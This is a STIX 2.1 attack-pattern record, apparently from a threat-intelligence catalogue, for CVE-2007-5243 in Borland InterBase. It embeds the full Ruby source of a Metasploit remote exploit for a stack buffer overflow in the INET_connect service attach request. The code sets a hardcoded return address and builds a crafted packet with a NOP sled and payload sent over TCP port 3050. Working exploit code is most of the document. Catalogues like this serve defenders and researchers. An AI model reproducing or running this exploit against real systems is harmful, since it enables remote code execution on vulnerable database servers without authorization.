{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ee780a56-146a-4634-8f51-6ba426f2064a",
    "created": "2024-08-14T16:57:27.159885Z",
    "modified": "2024-08-14T16:57:27.159889Z",
    "name": "Borland InterBase INET_connect() Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Borland InterBase by sending a specially crafted service attach request. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/ib_inet_connect.rb",
            "external_id": "ib_inet_connect.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-5243"
        },
        {
            "source_name": "reference",
            "url": "http://www.risesecurity.org/advisories/RISE-2007002.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'Borland InterBase INET_connect() Buffer Overflow',\n      'Description'\t=> %q{\n        This module exploits a stack buffer overflow in Borland InterBase\n        by sending a specially crafted service attach request.\n      },\n      'Author'\t=>\n        [\n          'Ramon de C Valle',\n          'Adriano Lima <adriano[at]risesecurity.org>',\n        ],\n      'Arch'\t\t=> ARCH_X86,\n      'Platform'\t=> 'linux',\n      'References'\t=>\n        [\n          [ 'CVE', '2007-5243' ],\n          [ 'OSVDB', '38605' ],\n          [ 'BID', '25917' ],\n          [ 'URL', 'http://www.risesecurity.org/advisories/RISE-2007002.txt' ],\n        ],\n      'Privileged'\t=> true,\n      'License'\t=> MSF_LICENSE,\n      'Payload'\t=>\n        {\n          'Space' => 512,\n          'BadChars' => \"\\x00\\x2f\\x3a\\x40\\x5c\",\n        },\n      'Targets'\t=>\n        [\n          # 0x0804d2ee 5b5e5f5dc3\n          [\n            'Borland InterBase LI-V8.0.0.53 LI-V8.0.0.54 LI-V8.1.0.253',\n            { 'Ret' => 0x0804d2ee }\n          ],\n        ],\n      'DefaultTarget'\t=> 0,\n      'DisclosureDate'  => '2007-10-03'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(3050)\n      ],\n      self.class\n    )\n\n  end\n\n  def exploit\n\n    connect\n\n    # Attach database\n    op_attach = 19\n\n    # Create database\n    op_create = 20\n\n    # Service attach\n    op_service_attach = 82\n\n    length = 161\n    remainder = length.remainder(4)\n    padding = 0\n\n    if remainder > 0\n      padding = (4 - remainder)\n    end\n\n    buf = ''\n\n    # Operation/packet type\n    buf << [op_service_attach].pack('N')\n\n    # Id\n    buf << [0].pack('N')\n\n    # Length\n    buf << [length].pack('N')\n\n    # Random alpha data\n    buf << rand_text_alpha(length - 5)\n\n    # Target\n    buf << [target.ret].pack('L')\n\n    # Separator\n    buf << ':'\n\n    # Padding\n    buf << \"\\x00\" * padding\n\n    # Database parameter block\n\n    # Length\n    buf << [1024].pack('N')\n\n    # It will return into this nop block\n    buf << make_nops(1024 - payload.encoded.length)\n\n    # Payload\n    buf << payload.encoded\n\n    sock.put(buf)\n\n    handler\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-10-03",
    "x_mitre_platforms": [
        "linux'"
    ]
}